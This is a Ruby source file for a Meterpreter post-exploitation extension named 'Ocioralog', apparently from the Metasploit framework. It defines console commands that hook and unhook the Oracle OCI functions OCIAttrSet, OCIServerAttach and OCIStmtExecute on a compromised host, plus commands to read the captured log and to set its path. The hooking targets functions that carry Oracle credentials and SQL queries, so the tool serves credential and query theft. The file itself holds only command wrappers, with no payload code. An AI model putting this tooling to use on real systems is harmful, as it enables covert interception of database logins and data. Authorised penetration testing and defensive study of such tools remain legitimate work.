# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# OCI hooking extension
#
###
class Console::CommandDispatcher::Ocioralog

	Klass = Console::CommandDispatcher::Ocioralog

	include Console::CommandDispatcher

	#
	# Initializes an instance.
	#
	def initialize(shell)
		super
	end

	#
	# List of supported commands.
	#
	def commands
		{
			"hook" => "Hook all critical functions",
			"unhook" => "Unhook the redirected functions",
			"hookOCIAttrSet" => "Hook the OCIAttrSet function",
			"hookOCIServerAttach" => "Hook the OCIServerAttach function",
			"hookOCIStmtExecute" => "Hook the OCIStmtExecute function",
			"unhookOCIAttrSet" => "Unhook the OCIAttrSet function",
			"unhookOCIServerAttach" => "Unhook the OCIServerAttach function",
			"unhookOCIStmtExecute" => "Unhook the OCIStmtExecute function",
			"getlogfile" => "Read and dump the content of the logfile",
			"setlogfile" => "Set the log file name and location (default value is c:\\\\TEMP\\\\ocioralog. Please note that you have to use double backslashes!"
		}
	end

	
	def cmd_hook()
		response=client.ocioralog.ocioralog_hook()
		print_line(response['response'])
		return true
	end

	def cmd_unhook()
		response=client.ocioralog.ocioralog_unhook()
		print_line(response['response'])
		return true
	end

	def cmd_hookOCIAttrSet()
		response=client.ocioralog.ocioralog_hookociattrset()
		print_line(response['response'])
		return true
	end


	def cmd_hookOCIServerAttach()
		response=client.ocioralog.ocioralog_hookociserverattach()
		print_line(response['response'])
		return true
	end

	def cmd_hookOCIStmtExecute()
		response=client.ocioralog.ocioralog_hookocistmtexecute()
		print_line(response['response'])
		return true
	end

	def cmd_unhookOCIAttrSet()
		response=client.ocioralog.ocioralog_unhookociattrset()
		print_line(response['response'])
		return true
	end


	def cmd_unhookOCIServerAttach()
		response=client.ocioralog.ocioralog_unhookociserverattach()
		print_line(response['response'])
		return true
	end

	def cmd_unhookOCIStmtExecute()
		response=client.ocioralog.ocioralog_unhookocistmtexecute()
		print_line(response['response'])
		return true
	end

	def cmd_getlogfile()
		response=client.ocioralog.ocioralog_getlogfile()
		print_line(response['response'])
		return true
	end

	def cmd_setlogfile(*args)
		print_line("Argument: "+args[0])
		response=client.ocioralog.ocioralog_setlogfile(args[0])
		print_line(response['response'])
		return true
	end

	#
	# Name for this dispatcher
	#
	def name
		"Ocioralog"
	end

end

end
end
end
end
